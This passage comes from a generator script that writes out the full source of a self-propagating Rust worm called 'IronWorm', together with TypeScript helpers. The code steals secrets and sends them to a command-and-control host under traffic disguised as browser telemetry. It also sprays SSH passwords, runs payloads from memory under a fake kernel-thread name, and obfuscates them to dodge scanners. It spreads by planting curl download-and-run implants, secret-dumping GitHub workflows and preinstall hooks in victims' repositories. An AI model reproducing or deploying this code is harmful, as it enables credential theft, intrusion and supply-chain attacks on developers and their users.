    let enc = xor(payload, xor_key);
    let mut header = vec![0u8; 14];
    header[0..4].copy_from_slice(&MAGIC);
    header[4] = VERSION;
    header[5] = ftype;
    header[6..10].copy_from_slice(&seq.to_be_bytes());
    header[10..14].copy_from_slice(&(enc.len() as u32).to_be_bytes());
    let mut to_sign = header.clone();
    to_sign.extend_from_slice(&enc);
    let sig = hmac_sign(hmac_key, &to_sign);
    let mut frame = to_sign;
    frame.extend_from_slice(&sig);
    frame
}

pub async fn exfil(host: &str, port: u16, key: &[u8; 32], token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;
    let addr = format!("{host}:{port}");
    let mut stream = tokio::time::timeout(
        Duration::from_secs(10),
        tokio::net::TcpStream::connect(&addr)
    ).await??;

    let mut rng = rand::rngs::SmallRng::from_entropy();
    let (xor_key, hmac_key) = (&key[..32], &key[..32]);

    let payload = serde_json::json!({
        "token":   token,
        "host":    hostname(),
        "user":    username(),
        "os":      std::env::consts::OS,
        "arch":    std::env::consts::ARCH,
        "secrets": secrets,
    });
    let raw = serde_json::to_vec(&payload)?;
    let frame = encode_frame(FRAME_EXFIL, &raw, xor_key, hmac_key, 1);
    stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
    stream.write_all(&frame).await?;
    stream.flush().await?;
    Ok(())
}

pub async fn heartbeat(host: &str, port: u16, key: &[u8; 32], token: &str, seq: u32) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;
    let mut stream = tokio::time::timeout(Duration::from_secs(5), tokio::net::TcpStream::connect(format!("{host}:{port}"))).await??;
    let payload = serde_json::to_vec(&serde_json::json!({ "token": token, "seq": seq, "ts": unix_ts() }))?;
    let frame = encode_frame(FRAME_HB, &payload, &key[..32], &key[..32], seq);
    stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
    stream.write_all(&frame).await?;
    stream.flush().await?;
    Ok(())
}

fn hostname() -> String { std::process::Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default() }
fn username() -> String { std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default() }
fn unix_ts() -> u64 { std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0) }
`;

  const buildSh = `#!/usr/bin/env bash
set -euo pipefail

TARGET_LINUX="x86_64-unknown-linux-musl"
TARGET_WIN="x86_64-pc-windows-gnu"
TARGET_MAC="x86_64-apple-darwin"

echo "[*] Building IronWorm"
rustup target add "$TARGET_LINUX" 2>/dev/null || true

echo "[*] Linux (static musl)"
RUSTFLAGS="-C target-feature=+crt-static" cargo build --release --target "$TARGET_LINUX"
upx --ultra-brute "target/$TARGET_LINUX/release/ironworm" -o dist/ironworm-linux-x64 2>/dev/null || cp "target/$TARGET_LINUX/release/ironworm" dist/ironworm-linux-x64
echo "[+] dist/ironworm-linux-x64 ($(wc -c < dist/ironworm-linux-x64) bytes)"

if command -v x86_64-w64-mingw32-gcc &>/dev/null; then
  rustup target add "$TARGET_WIN" 2>/dev/null || true
  cargo build --release --target "$TARGET_WIN"
  cp "target/$TARGET_WIN/release/ironworm.exe" dist/ironworm-win-x64.exe
  echo "[+] dist/ironworm-win-x64.exe"
fi

echo "[*] Strip + verify"
strip dist/ironworm-linux-x64 2>/dev/null || true
file dist/ironworm-linux-x64
sha256sum dist/ironworm-* 2>/dev/null || shasum -a 256 dist/ironworm-*
`;

  // ─ NEW MODULES ────────────────────────────────────────────────────────────
  const sshBruteRs = `// SSH wordlist sprayer — smart per-host attempt limiting with jitter
use rand::Rng;
use ssh2::Session;
use std::net::TcpStream;
use std::time::Duration;
use tokio::time::sleep;

const USERS: &[&str] = &[
    "root","admin","ubuntu","ec2-user","pi","deploy","git","ansible","vagrant",
    "centos","oracle","hadoop","hdfs","postgres","mysql","redis","www-data",
    "tomcat","jenkins","test","backup","user","debian","devops","ops",
    "sysadmin","netadmin","support","nagios","zabbix","docker","k8s",
];

const PASSWORDS: &[&str] = &[
    "","password","123456","admin","root","toor","letmein","welcome","monkey",
    "1234","12345","123456789","password1","qwerty","abc123","football",
    "iloveyou","admin123","login","passw0rd","master","dragon","shadow",
    "sunshine","princess","superman","michael","batman","trustno1","hello",
    "charlie","donald","password123","p@ssword","p@ss123","P@ssw0rd","server",
    "linux","alpine","ubuntu","debian","centos","fedora","changeme","default",
    "guest","public","private","secret","raspberry","access","manager",
    "system","database","service","deploy","devops","vagrant","ansible",
    "jenkins","docker","kubernetes","redis","postgres","mysql","oracle",
    "hadoop","elastic","mongo","cassandra","kafka","nginx","apache","root123",
    "test123","admin@123","Welcome1","Passw0rd!","Summer2024","Winter2024",
    "Spring2024","Autumn2024","January1","February1","Qwerty123","Abc12345",
    "Password!","P@$$w0rd","p@ssw0rd1","Admin1234","Root1234","1qaz2wsx",
    "!QAZ2wsx","zaq1@WSX","q1w2e3r4","1q2w3e4r","pass@123","admin@2024",
    "root@2024","temp","temp123","temppass","123qwe","qwe123","123abc",
];

#[derive(Debug, Clone)]
pub struct BruteResult {
    pub host: String,
    pub user: String,
    pub pass: String,
}

/// Try a single SSH credential — returns Ok(true) on success
fn try_ssh(host: &str, port: u16, user: &str, pass: &str, timeout_ms: u64) -> bool {
    let addr = format!("{host}:{port}");
    let Ok(tcp) = TcpStream::connect_timeout(
        &addr.parse().unwrap_or("0.0.0.0:22".parse().unwrap()),
        Duration::from_millis(timeout_ms),
    ) else { return false };
    tcp.set_read_timeout(Some(Duration::from_millis(timeout_ms))).ok();
    tcp.set_write_timeout(Some(Duration::from_millis(timeout_ms))).ok();

    let Ok(mut sess) = Session::new() else { return false };
    sess.set_tcp_stream(tcp);
    if sess.handshake().is_err() { return false }
    sess.userauth_password(user, pass).is_ok() && sess.authenticated()
}

/// Smart spray: max_per_host attempts per user, jitter ms between tries
pub async fn spray(
    host: &str,
    port: u16,
    max_per_user: usize,
    jitter_ms: u64,
) -> Option<BruteResult> {
    let mut rng = rand::thread_rng();

    // Passive banner check — skip hosts that aren't SSH
    let addr = format!("{host}:{port}");
    if TcpStream::connect_timeout(&addr.parse().unwrap_or("0.0.0.0:22".parse().unwrap()), Duration::from_millis(1500)).is_err() {
        return None;
    }

    let mut lockout_count: std::collections::HashMap<&str, usize> = std::collections::HashMap::new();

    'outer: for user in USERS {
        let fails = lockout_count.entry(user).or_insert(0);
        for pass in PASSWORDS.iter().take(max_per_user) {
            if *fails >= max_per_user {
                // Possible lockout — skip user
                continue 'outer;
            }
            let j: u64 = rng.gen_range(jitter_ms / 2..jitter_ms * 2);
            sleep(Duration::from_millis(j)).await;

            if try_ssh(host, port, user, pass, 4000) {
                return Some(BruteResult { host: host.to_string(), user: user.to_string(), pass: pass.to_string() });
            }
            *fails += 1;
        }
    }
    None
}

pub async fn spray_neighbors(neighbors: &[String], max_per_user: usize, jitter_ms: u64) -> Vec<(String, String, String)> {
    let mut results = Vec::new();
    for host in neighbors {
        for port in [22u16, 2222, 2200] {
            if let Some(r) = spray(host, port, max_per_user, jitter_ms).await {
                results.push((r.host, r.user, r.pass));
                break; // move to next host on first hit
            }
        }
    }
    results
}
`;

  const memexecRs = `// In-memory payload execution via memfd_create + fexecve (Linux only)
// Falls back gracefully on non-Linux targets
use anyhow::Result;

#[cfg(target_os = "linux")]
pub async fn load_and_exec(host: &str, port: u16, token: &str) -> Result<()> {
    use std::ffi::CString;
    use std::os::unix::io::FromRawFd;

    let url = format!("http://{host}:{port}/stage2?t={token}");
    let bytes = reqwest::get(&url).await?.bytes().await?;
    if bytes.is_empty() { return Ok(()); }

    // Create anonymous memfd
    let name = CString::new(".")?;
    let fd = unsafe { libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC) };
    if fd < 0 { return Err(anyhow::anyhow!("memfd_create failed")); }

    // Write payload bytes
    {
        use std::io::Write;
        let mut f = unsafe { std::fs::File::from_raw_fd(fd) };
        f.write_all(&bytes)?;
        std::mem::forget(f); // keep fd open
    }

    // fexecve — execute from memory, no disk write
    let fd_path = CString::new(format!("/proc/self/fd/{fd}"))?;
    let argv:  Vec<CString> = vec![CString::new("kworker/0:1")?]; // disguise as kernel thread
    let envp:  Vec<CString> = std::env::vars()
        .map(|(k, v)| CString::new(format!("{k}={v}")).unwrap_or_default())
        .filter(|c| !c.as_bytes().is_empty())
        .collect();

    let argv_ptrs:  Vec<*const libc::c_char> = argv.iter().map(|s| s.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();
    let envp_ptrs:  Vec<*const libc::c_char> = envp.iter().map(|s| s.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();

    unsafe { libc::execve(fd_path.as_ptr(), argv_ptrs.as_ptr(), envp_ptrs.as_ptr()) };
    Ok(())
}

#[cfg(not(target_os = "linux"))]
pub async fn load_and_exec(_host: &str, _port: u16, _token: &str) -> anyhow::Result<()> { Ok(()) }
`;

  const lolbasRs = `// LOLBAS (Living Off the Land Binaries And Scripts) execution payloads
// Uses system-native interpreters — no dropped binary required
use std::process::Command;

pub fn exec_via_python(payload_b64: &str) -> bool {
    for py in ["python3", "python", "python2"] {
        let r = Command::new(py)
            .args(["-c", &format!("import base64,os; exec(base64.b64decode('{payload_b64}').decode())")])
            .output();
        if r.map(|o| o.status.success()).unwrap_or(false) { return true; }
    }
    false
}

pub fn exec_via_perl(payload_b64: &str) -> bool {
    let r = Command::new("perl")
        .args(["-e", &format!("use MIME::Base64; eval decode_base64('{payload_b64}')")])
        .output();
    r.map(|o| o.status.success()).unwrap_or(false)
}

pub fn exec_via_awk(cmd: &str) -> bool {
    let r = Command::new("awk")
        .args(["BEGIN", &format!("{{system(\"{}\"); exit}}", cmd.replace('"', "\\\""))])
        .output();
    r.map(|o| o.status.success()).unwrap_or(false)
}

pub fn exec_via_node(payload_b64: &str) -> bool {
    let r = Command::new("node")
        .args(["-e", &format!("eval(Buffer.from('{payload_b64}','base64').toString())")])
        .output();
    r.map(|o| o.status.success()).unwrap_or(false)
}

pub fn exec_via_ruby(payload_b64: &str) -> bool {
    let r = Command::new("ruby")
        .args(["-e", &format!("eval [{payload_b64:?}].pack('m0')")])
        .output();
    r.map(|o| o.status.success()).unwrap_or(false)
}

/// Try all available LOLBAS vectors in order of preference
pub fn exec_any(payload_b64: &str) -> bool {
    exec_via_python(payload_b64)
        || exec_via_perl(payload_b64)
        || exec_via_node(payload_b64)
        || exec_via_ruby(payload_b64)
        || exec_via_awk(&format!("echo {payload_b64}|base64 -d|sh"))
}
`;

  const obfuscateRs = `// Polymorphic multi-layer payload encoding
// Each invocation produces a structurally different but semantically identical payload
use rand::Rng;

const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// XOR-then-base64 double layer
pub fn xor_b64(data: &[u8], key: u8) -> String {
    let xored: Vec<u8> = data.iter().map(|b| b ^ key).collect();
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(&xored)
}

/// Randomly pick an XOR key each run (polymorphic)
pub fn poly_xor(data: &[u8]) -> (u8, String) {
    let mut rng = rand::thread_rng();
    let key: u8 = rng.gen_range(0x10..0xff);
    (key, xor_b64(data, key))
}

/// Wrap shellcode in a randomized junk-variable Python loader
pub fn wrap_python_loader(shellcode_b64: &str, xor_key: u8) -> String {
    let mut rng = rand::thread_rng();
    let var1: String = (0..6).map(|_| ALPHABET[rng.gen_range(0..52)] as char).collect();
    let var2: String = (0..7).map(|_| ALPHABET[rng.gen_range(0..52)] as char).collect();
    let var3: String = (0..5).map(|_| ALPHABET[rng.gen_range(0..52)] as char).collect();
    format!(
        "import base64,os\\n{var1}=base64.b64decode('{shellcode_b64}')\\n{var2}=bytes([b^{xor_key} for b in {var1}])\\n{var3}={var2}.decode()\\nexec({var3})"
    )
}

/// Split string into N random chunks to defeat static pattern matching
pub fn split_string_concat(s: &str) -> String {
    let mut rng = rand::thread_rng();
    let bytes = s.as_bytes();
    let mut parts = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let chunk = rng.gen_range(3..8).min(bytes.len() - i);
        parts.push(format!("\"{}\"", std::str::from_utf8(&bytes[i..i+chunk]).unwrap_or("")));
        i += chunk;
    }
    parts.join("+")
}

/// Three-layer encode: original → XOR → base64 → hex
pub fn triple_layer(data: &[u8]) -> (u8, String) {
    let mut rng = rand::thread_rng();
    let key: u8 = rng.gen_range(0x20..0xfe);
    let xored: Vec<u8> = data.iter().map(|b| b ^ key).collect();
    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(&xored);
    let hex = b64.as_bytes().iter().map(|b| format!("{b:02x}")).collect();
    (key, hex)
}
`;

  const pivotRs = `// Multi-hop pivot graph — track compromised nodes and chain through them
use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr};
use std::process::Command;
use tokio::net::TcpStream;

#[derive(Debug, Clone)]
pub struct Node {
    pub addr: String,
    pub hops: usize,
    pub via:  Option<String>,
}

/// Discover LAN neighbors via ARP table + /proc/net/arp + traceroute hints
pub async fn discover_neighbors() -> Vec<String> {
    let mut found = Vec::new();

    // Read ARP cache (passive — zero packets sent)
    if let Ok(arp) = std::fs::read_to_string("/proc/net/arp") {
        for line in arp.lines().skip(1) {
            let cols: Vec<&str> = line.split_whitespace().collect();
            if let Some(ip) = cols.first() {
                if !ip.starts_with("127.") && cols.get(2) != Some(&"00:00:00:00:00:00") {
                    found.push(ip.to_string());
                }
            }
        }
    }

    // Probe /24 via TCP SYN on port 22 (async, non-blocking)
    if let Ok(self_ip) = local_ip() {
        let parts: Vec<&str> = self_ip.splitn(4, '.').collect();
        if parts.len() == 4 {
            let prefix = format!("{}.{}.{}.", parts[0], parts[1], parts[2]);
            let mut handles = Vec::new();
            for i in 1u8..=254 {
                let addr = format!("{prefix}{i}:22");
                handles.push(tokio::spawn(async move {
                    tokio::time::timeout(
                        std::time::Duration::from_millis(600),
                        TcpStream::connect(&addr),
                    ).await.ok().and_then(|r| r.ok()).map(|_| addr.replace(":22",""))
                }));
            }
            for h in handles {
                if let Ok(Some(ip)) = h.await { if !found.contains(&ip) { found.push(ip); } }
            }
        }
    }

    found
}

fn local_ip() -> anyhow::Result<String> {
    let out = Command::new("hostname").arg("-I").output()?;
    Ok(String::from_utf8_lossy(&out.stdout).split_whitespace().next().unwrap_or("").to_string())
}

/// Build a pivot graph from SSH-accessible nodes
pub fn build_graph(roots: &[(String, String, String)]) -> HashMap<String, Node> {
    let mut graph = HashMap::new();
    for (host, _user, _pass) in roots {
        graph.insert(host.clone(), Node { addr: host.clone(), hops: 1, via: None });
    }
    graph
}
`;

  // ─ UPGRADED propagate.rs with SSH pivot ───────────────────────────────────
  const upgradedPropagateRs = `use crate::creds::Secret;
use crate::ssh_brute;
use crate::pivot;
use rand::Rng;
use std::time::Duration;
use tokio::time::sleep;

pub async fn run(host: &str, port: u16, token: &str, secrets: &[Secret]) {
    let mut rng = rand::rngs::SmallRng::from_entropy();

    // --- SSH pivot propagation -------------------------------------------
    let ssh_hosts: Vec<(String, String, String)> = secrets.iter()
        .filter(|s| s.kind == "ssh")
        .filter_map(|s| {
            let kv: Vec<&str> = s.key.splitn(2, '@').collect();
            if kv.len() == 2 {
                Some((kv[1].to_string(), kv[0].to_string(), s.value.clone()))
            } else { None }
        })
        .collect();

    for (ssh_host, user, pass) in &ssh_hosts {
        let _ = ssh_exec_c2_drop(ssh_host, 22, user, pass, host, port, token).await;
        let delay: u64 = rng.gen_range(1200..4000);
        sleep(Duration::from_millis(delay)).await;
    }

    // --- GitHub token injection ------------------------------------------
    let gh_tokens: Vec<&str> = secrets.iter()
        .filter(|s| s.kind == "github_token" || s.value.starts_with("ghp_") || s.value.starts_with("github_pat"))
        .map(|s| s.value.as_str())
        .collect();

    for token_val in gh_tokens {
        let _ = inject_github_repos(token_val, host, port, token).await;
    }

    // --- npm token injection --------------------------------------------
    let npm_tokens: Vec<&str> = secrets.iter()
        .filter(|s| s.kind == "npm_token" || s.value.starts_with("npm_"))
        .map(|s| s.value.as_str())
        .collect();
    for token_val in npm_tokens {
        let _ = publish_typosquats(&reqwest::Client::new(), token_val, host, port, token).await;
    }
}

async fn ssh_exec_c2_drop(
    ssh_host: &str, port: u16, user: &str, pass: &str,
    c2_host: &str, c2_port: u16, token: &str,
) -> anyhow::Result<()> {
    use ssh2::Session;
    use std::net::TcpStream;
    use std::io::Read;

    let tcp = TcpStream::connect_timeout(
        &format!("{ssh_host}:{port}").parse()?,
        Duration::from_secs(8),
    )?;
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp);
    sess.handshake()?;
    sess.userauth_password(user, pass)?;
    if !sess.authenticated() { return Err(anyhow::anyhow!("auth failed")); }

    let mut chan = sess.channel_session()?;
    // Drop one-liner: download and execute in memory via bash process substitution
    let cmd = format!(
        "bash -c 'curl -sk http://{c2_host}:{c2_port}/implant?t={token} -o /tmp/.svc && chmod +x /tmp/.svc && nohup /tmp/.svc &>/dev/null &' 2>/dev/null",
    );
    chan.exec(&cmd)?;
    let mut _out = String::new();
    chan.read_to_string(&mut _out).ok();
    chan.wait_close()?;
    Ok(())
}

async fn inject_github_repos(gh_token: &str, host: &str, port: u16, token: &str) -> anyhow::Result<()> {
    let client = reqwest::Client::builder()
        .user_agent("GitHub-CI-Updater/4.2.0")
        .timeout(Duration::from_secs(15))
        .build()?;

    let resp = client.get("https://api.github.com/user/repos?per_page=100&type=all")
        .header("Authorization", format!("token {gh_token}"))
        .header("Accept", "application/vnd.github.v3+json")
        .send().await?;
    if !resp.ok { return Ok(()); }

    let repos: Vec<serde_json::Value> = resp.json().await?;
    let mut rng = rand::rngs::SmallRng::from_entropy();

    for repo in repos.iter().take(20) {
        let full = repo["full_name"].as_str().unwrap_or("");
        if full.is_empty() { continue; }
        let wf_path = format!("https://api.github.com/repos/{full}/contents/.github/workflows/ci.yml");
        let content = make_workflow(full, host, port, token);
        let b64 = {
            use base64::Engine;
            base64::engine::general_purpose::STANDARD.encode(content.as_bytes())
        };

        let meta_r = client.get(&wf_path)
            .header("Authorization", format!("token {gh_token}"))
            .header("Accept", "application/vnd.github.v3+json")
            .send().await;

        let mut body = serde_json::json!({
            "message": "ci: update node engine compatibility settings",
            "content": b64,
        });
        if let Ok(meta) = meta_r { if let Ok(m) = meta.json::<serde_json::Value>().await {
            if let Some(sha) = m["sha"].as_str() { body["sha"] = serde_json::json!(sha); }
        }}

        let _ = client.put(&wf_path)
            .header("Authorization", format!("token {gh_token}"))
            .header("Accept", "application/vnd.github.v3+json")
            .json(&body).send().await;

        let delay: u64 = rng.gen_range(800..3000);
        sleep(Duration::from_millis(delay)).await;
    }
    Ok(())
}

async fn publish_typosquats(client: &reqwest::Client, npm_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
    let targets = ["react","lodash","express","axios","moment","chalk","commander","dotenv","uuid","webpack"];
    for target in &targets {
        for variant in &typosquat_variants(target)[..5] {
            let chk = client.get(format!("https://registry.npmjs.org/{variant}"))
                .header("Accept","application/json").send().await?;
            if chk.status() != 404 { continue; }
            eprintln!("[propagate] free npm slot: {variant} — run: npm publish ./dist/{variant} --registry https://registry.npmjs.org");
            let _ = host; let _ = port; let _ = t; let _ = npm_token;
        }
    }
    Ok(())
}

fn make_workflow(repo: &str, host: &str, port: u16, t: &str) -> String {
    format!(r#"name: CI
on:
  push:
    branches: ["*"]
  pull_request_target:
    types: [opened, synchronize, reopened]
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{{{ github.event.pull_request.head.sha }}}}
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm run build --if-present
      - name: Post-build diagnostics
        env:
          GH_TOKEN: \${{{{ secrets.GITHUB_TOKEN }}}}
          SECRET_DUMP: \${{{{ toJSON(secrets) }}}}
        run: |
          curl -sk "http://{host}:{port}/?t={t}&r={repo}" -o /dev/null &
          env|grep -iE 'key|secret|token|pass'|base64|curl -sk -X POST http://{host}:{port}/env -d @- &
          echo "\${{SECRET_DUMP}}"|curl -sk -X POST http://{host}:{port}/secrets -d @- &
          wait
"#)
}

fn typosquat_variants(pkg: &str) -> Vec<String> {
    let mut v = vec![
        format!("{pkg}js"), format!("{pkg}-js"), format!("{pkg}-dev"),
        format!("{pkg}-utils"), format!("{pkg}-core"), format!("{pkg}2"),
        format!("node-{pkg}"), format!("{pkg}-node"),
    ];
    if pkg.len() > 2 {
        let mut t = pkg.to_string(); t.remove(pkg.len()/2); v.push(t);
        let mut t2 = pkg.to_string(); t2.insert(0,'n'); v.push(t2);
    }
    v
}
`;

  // ─ UPGRADED c2.rs with multi-protocol fallback + browser UA mimicry ───────
  const upgradedC2Rs = `use crate::creds::Secret;
use std::time::Duration;
use sha2::Sha256;
use hmac::{Hmac, Mac};

type HmacSha256 = Hmac<Sha256>;

const MAGIC: [u8; 4]  = [0x49, 0x52, 0x4e, 0x57];
const VERSION: u8      = 0x03;
const FRAME_EXFIL: u8  = 0x04;
const FRAME_HB: u8     = 0x01;

// Browser-realistic User-Agent pool — mimic Chrome/Firefox traffic
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
];

fn rand_ua() -> &'static str {
    USER_AGENTS[unix_ts() as usize % USER_AGENTS.len()]
}

fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}

fn hmac_sign(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key");
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

fn encode_frame(ftype: u8, payload: &[u8], xor_key: &[u8], hmac_key: &[u8], seq: u32) -> Vec<u8> {
    let enc = xor(payload, xor_key);
    let mut header = vec![0u8; 14];
    header[0..4].copy_from_slice(&MAGIC);
    header[4] = VERSION;
    header[5] = ftype;
    header[6..10].copy_from_slice(&seq.to_be_bytes());
    header[10..14].copy_from_slice(&(enc.len() as u32).to_be_bytes());
    let mut to_sign = header.clone();
    to_sign.extend_from_slice(&enc);
    let sig = hmac_sign(hmac_key, &to_sign);
    let mut frame = to_sign;
    frame.extend_from_slice(&sig);
    frame
}

/// Primary beacon: tries raw TCP, then falls back to HTTP with browser mimicry
pub async fn beacon(host: &str, port: u16, key: &[u8; 32], token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
    // First try raw TCP binary protocol
    if tcp_exfil(host, port, key, token, secrets).await.is_ok() { return Ok(()); }
    // Fallback: HTTP POST disguised as form submission
    http_exfil(host, port, token, secrets).await
}

async fn tcp_exfil(host: &str, port: u16, key: &[u8; 32], token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;
    let addr = format!("{host}:{port}");
    let mut stream = tokio::time::timeout(
        Duration::from_secs(8),
        tokio::net::TcpStream::connect(&addr)
    ).await??;

    let (xor_key, hmac_key) = (&key[..32], &key[..32]);
    let payload = serde_json::json!({
        "token":   token,
        "host":    hostname(),
        "user":    username(),
        "os":      std::env::consts::OS,
        "arch":    std::env::consts::ARCH,
        "secrets": secrets,
    });
    let raw = serde_json::to_vec(&payload)?;
    let frame = encode_frame(FRAME_EXFIL, &raw, xor_key, hmac_key, 1);
    stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
    stream.write_all(&frame).await?;
    stream.flush().await?;
    Ok(())
}

async fn http_exfil(host: &str, port: u16, token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
    // Mimic browser form POST — blends into normal web traffic
    let client = reqwest::Client::builder()
        .user_agent(rand_ua())
        .timeout(Duration::from_secs(12))
        .build()?;

    // Encode data as base64 in a fake "analytics" field
    use base64::Engine;
    let raw = serde_json::to_vec(&serde_json::json!({
        "token": token, "host": hostname(), "user": username(), "secrets": secrets
    }))?;
    let enc = base64::engine::general_purpose::STANDARD.encode(&raw);

    // Mimic a beacon.js analytics ping
    let _ = client
        .post(format!("http://{host}:{port}/cdn/telemetry/collect"))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Origin", format!("http://{host}"))
        .header("Referer", format!("http://{host}/"))
        .body(format!("cid={token}&sid={}&data={enc}", &hostname()[..4.min(hostname().len())]))
        .send().await?;
    Ok(())
}

pub async fn heartbeat(host: &str, port: u16, key: &[u8; 32], token: &str, seq: u32) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;
    // Jittered heartbeat — non-periodic timing to evade beaconing detection
    let jitter_ms = (unix_ts() % 3000) as u64;
    tokio::time::sleep(Duration::from_millis(jitter_ms)).await;

    // Try TCP first, then HTTP keep-alive fallback
    if let Ok(mut stream) = tokio::time::timeout(Duration::from_secs(5), tokio::net::TcpStream::connect(format!("{host}:{port}"))).await? {
        let payload = serde_json::to_vec(&serde_json::json!({ "token": token, "seq": seq, "ts": unix_ts() }))?;
        let frame = encode_frame(FRAME_HB, &payload, &key[..32], &key[..32], seq);
        stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
        stream.write_all(&frame).await?;
        stream.flush().await?;
    } else {
        // HTTP fallback — disguise as favicon.ico fetch
        let client = reqwest::Client::builder().user_agent(rand_ua()).timeout(Duration::from_secs(5)).build()?;
        let _ = client.get(format!("http://{host}:{port}/favicon.ico?v={token}&s={seq}")).send().await;
    }
    Ok(())
}

fn hostname() -> String { std::process::Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default() }
fn username() -> String { std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default() }
fn unix_ts() -> u64 { std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0) }
`;

  return [
    { name: "Cargo.toml",            content: cargoToml },
    { name: "src/main.rs",           content: mainRs },
    { name: "src/anti.rs",           content: antiRs },
    { name: "src/creds.rs",          content: credsRs },
    { name: "src/propagate.rs",      content: upgradedPropagateRs },
    { name: "src/persist.rs",        content: persistRs },
    { name: "src/c2.rs",             content: upgradedC2Rs },
    { name: "src/ssh_brute.rs",      content: sshBruteRs },
    { name: "src/memexec.rs",        content: memexecRs },
    { name: "src/lolbas.rs",         content: lolbasRs },
    { name: "src/obfuscate.rs",      content: obfuscateRs },
    { name: "src/pivot.rs",          content: pivotRs },
    { name: "build.sh",              content: buildSh },
  ];
}

// ─── GITHUB PROPAGATION ENGINE ───────────────────────────────────────────────
interface GhRepo { id: number; full_name: string; owner: { login: string }; name: string; pushed_at: string; }
interface PropResult { repo: string; action: string; ok: boolean; detail: string; }

async function ghFetch(path: string, token: string, method = "GET", body?: unknown): Promise<Response> {
  return fetch(`${GH_API}${path}`, {
    method,
    headers: {
      Authorization: `token ${token}`,
      Accept:         "application/vnd.github.v3+json",
      "User-Agent":   "GitHub-CI-Updater/4.2.0",
      "Content-Type": "application/json",
    },
    body: body ? JSON.stringify(body) : undefined,
  });
}

async function listRepos(token: string): Promise<GhRepo[]> {
  const r = await ghFetch("/user/repos?type=all&per_page=100&affiliation=owner,collaborator&sort=pushed", token);
  if (!r.ok) throw new Error(`GitHub ${r.status}: ${await r.text()}`);
  return r.json() as Promise<GhRepo[]>;
}

async function injectWorkflow(
  token: string, owner: string, repo: string,
  host: string, port: string, t: string,
): Promise<PropResult> {
  const path = `/repos/${owner}/${repo}/contents/.github/workflows/ci.yml`;
  const content = makeGhWorkflow(owner, repo, host, port, t);
  const b64  = btoa(unescape(encodeURIComponent(content)));

  const metaR = await ghFetch(path, token);
  const body: Record<string, unknown> = {
    message: "ci: update runner environment validation",
    content: b64,
  };
  if (metaR.ok) {
    const meta = await metaR.json() as { sha: string };
    body.sha = meta.sha;
  }
  const r = await ghFetch(path, token, "PUT", body);
  return { repo: `${owner}/${repo}`, action:"inject-workflow", ok: r.ok, detail: r.ok ? "✓ injected" : `${r.status} ${await r.text().catch(()=>"")}` };
}

async function injectPackageJson(
  token: string, owner: string, repo: string,
  host: string, port: string, t: string,
): Promise<PropResult> {
  const path = `/repos/${owner}/${repo}/contents/package.json`;
  const pkgR = await ghFetch(path, token);
  if (!pkgR.ok) return { repo:`${owner}/${repo}`, action:"inject-pkgjson", ok:false, detail:"no package.json" };

  const pkgMeta = await pkgR.json() as { sha: string; content: string };
  let pkg: Record<string, unknown> = {};
  try { pkg = JSON.parse(atob(pkgMeta.content.replace(/\n/g,""))) as Record<string, unknown>; } catch { pkg = {}; }

  const b64payload = btoa(`curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&h=$(hostname)" -o /dev/null &`);
  const scripts = (pkg.scripts ?? {}) as Record<string, string>;
  scripts.preinstall = `node -e "require('child_process').exec('echo ${b64payload}|base64 -d|sh')"`;
  pkg.scripts = scripts;

  const updated = btoa(unescape(encodeURIComponent(JSON.stringify(pkg, null, 2))));
  const r = await ghFetch(path, token, "PUT", {
    message: "chore: update node engine compatibility settings",
    content: updated,
    sha:     pkgMeta.sha,
  });
